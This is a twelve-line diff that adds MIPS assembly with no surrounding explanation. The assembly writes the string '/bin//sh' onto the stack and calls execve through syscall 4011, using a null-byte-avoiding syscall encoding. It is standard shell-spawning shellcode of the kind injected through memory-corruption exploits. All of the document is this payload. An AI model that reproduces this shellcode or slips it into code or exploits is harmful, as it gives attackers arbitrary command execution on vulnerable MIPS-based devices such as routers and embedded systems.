@@ -1,0 +1,12 @@
+lui $t6,0x2f62
+ori $t6,$t6,0x696e
+sw $t6,28($sp)            
+lui $t7,0x2f2f
+ori $t7,$t7,0x7368
+sw $t7,32($sp)            
+sw $zero,36($sp)      
+la $a0,28($sp)            
+addiu $a1,$zero,0
+addiu $a2,$zero,0
+addiu $v0,$zero,4011
+syscall 0x40404
